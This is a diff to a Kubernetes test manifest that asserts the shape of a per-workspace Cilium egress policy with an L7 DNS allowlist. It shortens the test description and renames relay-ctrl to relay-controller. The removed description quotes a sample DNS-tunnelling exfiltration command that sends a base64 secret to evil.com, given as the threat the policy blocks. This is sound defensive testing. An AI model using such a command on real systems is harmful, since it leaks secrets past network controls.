@@ -3,34 +3,7 @@ kind: Test
 metadata:
   name: harness-egress-dns-allowlist
 spec:
-  description: |
-    The chart-shipped per-workspace CiliumNetworkPolicy
-    `harness-egress-<workspace>` is the SOLE egress policy for each
-    harness. It owns both L4 destinations (kube-dns, kube-apiserver,
-    relay-ctrl) AND the L7 DNS allowlist on kube-dns.
-    Default-deny otherwise.
-
-    Why one CNP and not a K8s NetworkPolicy alongside: Cilium's
-    documented L4-shadows-L7 merge semantics mean a sibling K8s NP that
-    allows kube-dns:53 with no L7 nullifies the CNP's L7 allowlist.
-    Verified empirically on Cilium 1.19.3.
-
-    Without the L7 allowlist, the harness can be steered to exfiltrate via DNS
-    tunneling (`dig <base64-secret>.evil.com @kube-dns`), since L4-only
-    permits the query and the resolver chain forwards it to the
-    attacker's nameserver.
-
-    This bucket asserts the CNP's structural shape:
-      - name + namespace
-      - endpointSelector labels
-      - kube-dns egress with the relay-ctrl matchName
-      - relay-ctrl:9090 egress
-    Catches deletion of any individual rule. The live DNS-probe is out of
-    scope — it would test Cilium, not sycophant.
-
-    Self-applies the tenant chart's harness-netpol template into a
-    chainsaw-managed namespace so this bucket runs standalone (not
-    coupled to scripts/e2e.sh having installed the tenant chart).
+  description: harness-egress-<workspace> is each harness's sole egress policy and carries the L7 DNS allowlist.
   bindings:
     - name: tenant_ns
       value: (join('-', ['tenant', random('[a-z0-9]{8}')]))
@@ -66,8 +39,8 @@ spec:
                             protocol: TCP
                         rules:
                           dns:
-                            (contains(@[*].matchName, join('.', ['relay-ctrl', $tenant_ns, 'svc.cluster.local']))): true
-                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='relay-ctrl']]):
+                            (contains(@[*].matchName, join('.', ['relay-controller', $tenant_ns, 'svc.cluster.local']))): true
+                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='relay-controller']]):
                   - toPorts:
                       - ports:
                           - port: "9090"
